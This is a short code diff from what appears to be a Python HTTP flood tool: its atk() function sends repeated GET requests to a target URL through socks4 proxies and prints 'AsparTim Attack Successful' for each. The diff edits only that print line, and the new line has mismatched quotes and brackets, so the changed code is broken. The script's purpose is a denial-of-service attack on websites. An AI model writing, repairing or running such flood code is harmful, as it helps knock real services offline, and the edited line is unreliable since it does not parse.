@@ -205,13 +205,14 @@ def atk():
 				try:
 					for y in range(pwr):
 						s.get(url)
-						print("[+] AsparTim Attack Successful [ "+ str(proxy[0])+":"+str(proxy[1])+ "]")
+						print("[+] AsparTim Attack Successful [ "+str(proxy[0])+":"+str(proxy[1]) ] ")
 					s.close
 				except:
 					s.close()
 			except:
 				s.close()
 				print("[!] Can't Connet To This Socks4")
+
 
 if __name__ == "__main__":
 	main()
